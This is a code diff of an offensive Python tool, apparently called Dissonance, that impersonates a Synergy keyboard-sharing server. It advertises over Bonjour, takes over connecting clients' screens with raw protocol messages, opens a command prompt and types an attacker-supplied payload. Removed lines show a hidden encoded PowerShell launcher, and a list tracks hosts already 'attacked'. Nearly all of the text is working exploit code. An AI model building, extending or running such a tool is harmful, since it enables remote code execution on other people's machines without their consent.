@@ -3,28 +3,25 @@ from __future__ import absolute_import, division, print_function
 import sys
 import socket
 import logging
+import argparse
 from thread import *
 from time import sleep
 from scapy.all import *
 from zeroconf import ServiceBrowser, ServiceStateChange, ServiceInfo, Zeroconf
 
 def banner():
-    banner = '''  _____  _
- |  __ \(_)
- | |  | |_ ___ ___  ___  _ __   __ _ _ __   ___ ___
- | |  | | / __/ __|/ _ \| '_ \ / _` | '_ \ / __/ _ \\
- | |__| | \__ \__ \ (_) | | | | (_| | | | | (_|  __/
- |_____/|_|___/___/\___/|_| |_|\__,_|_| |_|\___\___|
-
-              Rouge Synergy Server
-                     ~n00py~
-                     '''
+    banner = '''
+   ,-~~-.___.
+  / |  x     \\
+ (  )        0            _____  _         Rouge Synergy Server
+  \_/-, ,----'  ____     |  __ \(_)               ~n00py~
+     ====      ||   \_   | |  | |_ ___ ___  ___  _ __   __ _ _ __   ___ ___
+    /  \-'~;   ||     |  | |  | | / __/ __|/ _ \| '_ \ / _` | '_ \ / __/ _ \\
+   /  __/~| ...||__/|-"  | |__| | \__ \__ \ (_) | | | | (_| | | | | (_|  __/
+ =(  _____||________|    |_____/|_|___/___/\___/|_| |_|\__,_|_| |_|\___\___|
+                 '''
 
     print (banner)
-
-
-payload = "powershell.exe -NoP -sta -NonI -W Hidden -Enc "
-hosts = [] # Blacklist for systems already compromised
 
 def start_listener(port):
 
@@ -51,7 +48,7 @@ def establish_connection(conn):
     data = conn.recv(1024)
     hostname = data[19:]
     print ("Hostname: " + hostname)
-    if hostname not in hosts:
+    if hostname not in blacklist:
         conn.send('\x00\x00\x00\x04\x51\x49\x4e\x46')  # query screen info
         conn.send('\x00\x00\x00\x04\x43\x49\x41\x4b')  # send resolution change acknowledgement
         sleep(1)
@@ -65,7 +62,7 @@ def establish_connection(conn):
         print ("Entering Screen...")
         conn.send('\x00\x00\x00\x0e\x43\x49\x4e\x4e\x00\x00\x00\x8c\x00\x00\x00\x01\x00\x00') # enter the client screen
         sleep(1)
-        hosts.append(hostname)
+        blacklist.append(hostname)
     else:
         print ("Host \"" + hostname + "\" has already been attacked, restart the server to attack this host again.")
         return False
@@ -86,7 +83,6 @@ def open_cmd(conn):
     conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\x0d\x00\x00\x00\x1c')  # send enter
     sleep(1)
 
-
 def send_payload(conn, payload):
     i = 0
     print ("Sending payload...")
@@ -97,25 +93,26 @@ def send_payload(conn, payload):
     conn.send('\x00\x00\x00\x0a\x44\x4b\x44\x4e\xef\x0d\x00\x00\x00\x1c')  # send enter
     print ("Payload sent!")
 
-
-
-def windows_shell(conn):
+def windows_shell(conn,payload):
     if establish_connection(conn) != False:
         open_cmd(conn)
         send_payload(conn, payload)
 
-
 def get_ip():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.connect(('8.8.8.8', 53))
-    ip = sock.getsockname()[0]
-    sock.close()
+    try:
+        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        sock.connect(('8.8.8.8', 53))
+        ip = sock.getsockname()[0]
+        sock.close()
+    except:
+        print ("Attempted to determine your local IP, but could not. Supply the IP of the interface you want to use with --ip")
     return ip
 
-def bonjour():
+def bonjour(ip_addr):
     print ("Sending Bonjour advertisements")
     zeroconf = Zeroconf()
-    ip_addr = get_ip()
+    if not ip_addr:
+        ip_addr = get_ip()
     hostname = socket.gethostname()
     hostname = hostname.split(".", 1)[0]
     print ("Hostname is: " +hostname)
@@ -180,15 +177,40 @@ def browser():
         print ("")
         #zeroconf.close()
 
-def start():
-    bonjour()
+def start(payload):
     s = start_listener(24800)
     while 1:
         conn, addr = s.accept()
         print ('Connected with ' + addr[0] + ':' + str(addr[1]))
-        start_new_thread(windows_shell, (conn,))
+        start_new_thread(windows_shell, (conn,payload))
     s.close()
 
-banner()
-#browser()
-#bonjour()
+blacklist = [] # Blacklist for systems that have alread connected
+
+def main():
+    parser = argparse.ArgumentParser(description='')
+    parser.add_argument('-b','--bonjour',help=' Use this option to broadcast MDNS advertisements when starting the server', required=False, action='store_true')
+    parser.add_argument('-s', '--sniff', help=' Use this option to sniff for MDNS advertisements', required=False, action='store_true')
+    parser.add_argument('-p', '--payload', help='Filepath to the payload', required=False)
+    parser.add_argument('-i', '--ip', help='IP address of listening server', required=False)
+
+    args = parser.parse_args()
+    banner()
+
+    if args.sniff:
+        print ("Now sniffing for Synergy activity...")
+        browser()
+    if not args.sniff:
+        if args.payload:
+            p = open(args.payload, 'r')
+            payload = p.read()
+            if args.bonjour:
+                bonjour(args.ip)
+            start(payload)
+        else:
+            print ("You did not specify a payload file. Use the -p switch")
+
+
+if __name__ == "__main__":
+
+    main()
